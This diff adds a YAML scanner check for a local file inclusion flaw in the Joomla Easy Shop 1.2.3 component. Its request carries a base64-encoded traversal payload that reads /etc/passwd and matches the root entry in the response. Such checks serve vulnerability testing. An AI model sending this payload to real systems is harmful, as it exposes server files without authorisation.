@@ -1,0 +1,13 @@
+name: poc-yaml-joomla-lfi
+rules:
+  - method: GET
+    path: >-
+      /index.php?option=com_easyshop&task=ajax.loadImage&file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+    follow_redirects: true
+    expression: |
+      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+detail:
+  author: pa55w0rd(www.pa55w0rd.online/)
+  Affected Version: "Joomla! Component Easy Shop 1.2.3 - Local File Inclusion"
+  links:
+    - https://www.exploit-db.com/exploits/46219
